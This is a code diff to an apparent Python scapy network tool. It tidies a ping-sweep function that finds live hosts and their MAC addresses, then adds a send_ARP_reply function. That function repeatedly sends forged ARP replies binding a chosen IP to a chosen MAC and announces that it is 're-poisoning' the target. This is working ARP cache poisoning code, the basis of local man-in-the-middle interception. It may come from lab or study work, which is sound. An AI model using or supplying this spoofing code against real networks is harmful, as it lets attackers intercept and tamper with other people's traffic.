@@ -1,6 +1,6 @@
 from scapy.all import *
 # For escape pylint's bug
-from scapy.layers.inet import IP, UDP, TCP, ICMP, Ether
+from scapy.layers.inet import IP, UDP, TCP, ICMP, Ether, ARP
 from random import randint
 import threading
 import binascii
@@ -104,7 +104,6 @@ def get_alive_ip_and_mac(interface, dst_ip_list, times = 10, verbose= True):
         threads.append(threading.Thread(target = send_ping, args = (dst_ip,)))
         threads[i].start()
 
-
     while now_counting != len(dst_ip_list) * times:
 
         pkt = s.recvfrom(1500)[0]
@@ -112,12 +111,32 @@ def get_alive_ip_and_mac(interface, dst_ip_list, times = 10, verbose= True):
         ip_src = socket.inet_ntoa(storeobj[8])
         storeobj = struct.unpack("!6s6sH", pkt[:14])
         mac_src = binascii.hexlify(storeobj[1])
-
+        split_mac_src = []
+        for i in range(0, 12, 2):
+            split_mac_src.append(mac_src[i:i+2])
+        mac_src = (b':'.join(split_mac_src)).decode()
         if ip_src in dst_ip_list and (ip_src, mac_src) not in alive_list: 
             alive_list.append((ip_src,mac_src))
 
     if verbose:
         print(f"\nresult: find {len(alive_list)} / {len(dst_ip_list)}: {alive_list}")
 
+    s.close()
+
     return alive_list
+
+def send_ARP_reply(interface, ip_src, mac_src, ip_dst, mac_dst, times = 10):
+    
+    arppkt = Ether()/ARP()
+    arppkt[ARP].op = ARP.is_at
+
+    arppkt[ARP].hwdst = mac_dst
+    arppkt[ARP].pdst = ip_dst
+    arppkt[ARP].hwsrc = mac_src
+    arppkt[ARP].psrc =  ip_src
+    for i in range(times):
+        send(arppkt, verbose=0)
+
+    print(f're-poisoning {times} times to let {ip_dst} know {mac_src} <=> {ip_src}')    
+
 
